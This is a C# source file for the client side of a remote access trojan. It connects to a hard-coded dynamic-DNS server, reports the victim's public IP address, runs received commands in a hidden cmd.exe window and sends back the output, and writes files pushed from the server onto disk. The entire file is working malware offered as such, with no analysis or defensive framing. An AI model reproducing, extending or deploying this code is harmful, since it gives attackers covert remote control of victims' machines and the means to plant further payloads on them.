using System;
using System.Data;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.IO.Compression;
using System.Linq;
using System.Net;

namespace RAT_clientside
{
    class Program
    {
        private static string HostName = "njratserver420.ddns.net";
        private static int Port = 6258;

        private static StreamReader sr;
        private static StreamWriter sw;

        private static TcpClient client;

        private static bool ConnectedToServer()
        {
            try
            {
                TcpClient connectedToServerTcpClient = new TcpClient(HostName,6258);
                connectedToServerTcpClient.Dispose();
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private static bool KeepAlive = true;

        private static string cmd;
        private static string output;

        public static void Main(string[] args)
        {
            while (KeepAlive)
            {
                try
                {
                    client = new TcpClient(HostName, Port);

                    sw = new StreamWriter(client.GetStream());
                    sr = new StreamReader(client.GetStream());

                    try
                    {
                        sw.WriteLine(new WebClient().DownloadString(@"http://icanhazip.com").Trim());
                        sw.Flush();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    } //Send the ip of the client

                    while (ConnectedToServer())
                    {
                        try
                        {
                            cmd = sr.ReadLine();
                            Console.WriteLine(cmd);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e);
                        } //Get the Command

                        if (cmd.StartsWith("E+"))
                        {
                            string exeCmd = cmd.Substring(2);
                            Console.WriteLine("E");

                            Process cmdProcess = new Process();
                            cmdProcess.StartInfo.CreateNoWindow = true;
                            cmdProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            cmdProcess.StartInfo.UseShellExecute = false;
                            cmdProcess.StartInfo.RedirectStandardOutput = true;
                            cmdProcess.StartInfo.FileName = "cmd.exe";

                            cmdProcess.StartInfo.Arguments = "/C" + exeCmd;
                            cmdProcess.Start();

                            output = cmdProcess.StandardOutput.ReadToEnd();

                            Console.WriteLine(output);

                            exeCmd = string.Empty;
                            cmd = string.Empty;
                            //Execute command and send back output
                        }

                        if (cmd.StartsWith("S"))
                        {
                            string[] recvArgs = new string[2];
                            recvArgs = cmd.Split(new char[]{Convert.ToChar("*")});

                            int length = Convert.ToInt32(sr.ReadLine());
                            byte[] data = new byte[length];

                            for (int i = 0; i < data.Length; i++)
                            {
                                data[i] = Convert.ToByte(sr.ReadLine());
                            }

                            File.WriteAllBytes(recvArgs[1], decompressBytes(data));

                            output = "Recived " + data.Length + " bytes!";

                        }

                        if (cmd.StartsWith("killAll"))
                        {
                            Console.WriteLine("killAll");
                            KeepAlive = false;
                        }

                        try
                        {
                            sw.WriteLine(output);
                            sw.Flush();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e);
                        }

                        output = string.Empty;

                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                } //Try to connect to the server

            }
        }

        public static byte[] decompressBytes(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream ds = new DeflateStream(input, CompressionMode.Decompress))
            {
                ds.CopyTo(output);
            }
            return output.ToArray();
        }
    }

}